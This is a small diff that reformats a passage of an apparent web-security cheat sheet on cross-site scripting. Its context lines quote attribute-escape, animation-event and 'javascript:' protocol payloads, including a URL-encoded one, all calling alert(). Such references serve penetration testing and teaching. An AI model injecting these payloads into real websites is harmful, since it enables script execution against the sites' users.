@@ -44,7 +44,7 @@ If you **cannot escape from the tag**, you could create new attributes inside th
 " onfocus=alert(1) id=x tabindex=0 style=display:block>#x #Access http://site.com/?#x t
 ```
 
-**Style events**
+* **Style events**
 
 `<p style="animation: x;" onanimationstart="alert()">XSS</p>`
 
@@ -103,7 +103,7 @@ The **HTML encoded characters** inside the value of HTML tags attributes are **d
 
 There you can use the protocols **`javascript:`** or **`data:`** in some places to **execute arbitrary JS code**. Some will require user interaction on some won't.
 
-```html
+```js
 javascript:alert(1)
 JavaSCript:alert(1)
 javascript:%61%6c%65%72%74%28%31%29 //URL encode
